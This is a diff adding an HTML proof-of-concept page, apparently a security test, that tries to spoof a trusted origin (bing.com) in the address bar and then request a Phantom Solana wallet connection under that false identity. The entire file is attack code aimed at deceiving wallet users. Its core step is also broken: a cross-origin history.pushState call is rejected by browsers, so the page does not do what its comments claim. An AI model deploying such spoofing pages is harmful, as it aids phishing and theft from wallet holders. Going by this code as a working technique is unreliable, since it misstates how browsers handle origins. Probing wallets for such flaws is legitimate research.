@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phantom Wallet Origin Spoofing</title>
+    <script>
+        function spoofOriginAndConnect() {
+            // Change the address bar to spoof a trusted origin
+            history.pushState({}, "Bing.com", "https://bing.com:1234");
+
+            // Attempt to interact with Phantom Wallet
+            try {
+                setTimeout(() => {
+                    if (window.phantom && window.phantom.solana) {
+                        // Attempt to spoof the origin and establish a connection
+                        window.phantom.solana.connect().then((response) => {
+                            console.log("Connection successful:", response);
+                            alert("Wallet connected: " + JSON.stringify(response));
+                        }).catch((error) => {
+                            console.error("Connection failed:", error);
+                            alert("Connection failed: " + error.message);
+                        });
+                    } else {
+                        console.error("Phantom Wallet not detected.");
+                        alert("Phantom Wallet not detected.");
+                    }
+                }, 1000);
+            } catch (e) {
+                console.error("Error during spoofing attempt:", e);
+                alert("Error during spoofing attempt: " + e.message);
+            }
+        }
+    </script>
+</head>
+<body>
+    <h1>Phantom Wallet Spoofing Test</h1>
+    <button onclick="spoofOriginAndConnect()">Run Spoofing Test</button>
+</body>
+</html>
